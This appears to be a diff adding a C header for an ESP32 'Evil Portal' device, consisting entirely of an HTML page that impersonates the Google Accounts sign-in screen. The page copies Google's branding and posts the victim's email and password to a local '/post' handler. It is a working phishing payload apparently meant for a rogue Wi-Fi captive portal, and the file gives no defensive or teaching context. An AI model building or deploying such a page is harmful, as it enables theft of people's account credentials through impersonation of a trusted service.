@@ -1,0 +1,36 @@
+#pragma once
+
+// Compact Evil Portal HTML — no PROGMEM issues
+// Stored as regular const char* (ESP32 flash is memory-mapped)
+const char EVIL_PORTAL_HTML[] = 
+"<!DOCTYPE html><html><head>"
+"<title>Sign in - Google Accounts</title>"
+"<meta charset='UTF-8'>"
+"<meta name='viewport' content='width=device-width,initial-scale=1'>"
+"<style>"
+"*{margin:0;padding:0;box-sizing:border-box}"
+"body{font-family:-apple-system,Arial,sans-serif;background:#f6f6f6;padding:10px}"
+".c{max-width:360px;margin:20px auto;background:#fff;border-radius:8px;padding:24px;border:1px solid #ddd}"
+".g{text-align:center;margin-bottom:16px}"
+".g b{color:#4285f4;font-size:22px}"
+".g span{color:#ea4335;font-size:22px}"
+".g i{color:#fbbc05;font-size:22px;font-style:normal}"
+".g em{color:#34a853;font-size:22px;font-style:normal}"
+"h2{text-align:center;font-size:20px;font-weight:400;color:#202124;margin-bottom:4px}"
+"p{text-align:center;font-size:13px;color:#5f6368;margin-bottom:20px}"
+".f{margin-bottom:16px}"
+".f label{display:block;font-size:12px;color:#5f6368;margin-bottom:4px}"
+".f input{width:100%;height:40px;padding:8px 12px;border:1px solid #dadce0;border-radius:4px;font-size:15px;outline:none}"
+".f input:focus{border:2px solid #1a73e8}"
+".r{text-align:right;margin-top:20px}"
+".r button{background:#1a73e8;color:#fff;border:none;padding:8px 22px;border-radius:4px;font-size:14px}"
+"</style></head><body>"
+"<div class='c'>"
+"<div class='g'><b>G</b><span>o</span><i>o</i><b>g</b><em>l</em><span>e</span></div>"
+"<h2>Sign in</h2>"
+"<p>Use your Google Account</p>"
+"<form method='POST' action='/post'>"
+"<div class='f'><label>Email or phone</label><input name='email' type='text' required autofocus></div>"
+"<div class='f'><label>Password</label><input name='password' type='password' required></div>"
+"<div class='r'><button type='submit'>Next</button></div>"
+"</form></div></body></html>";
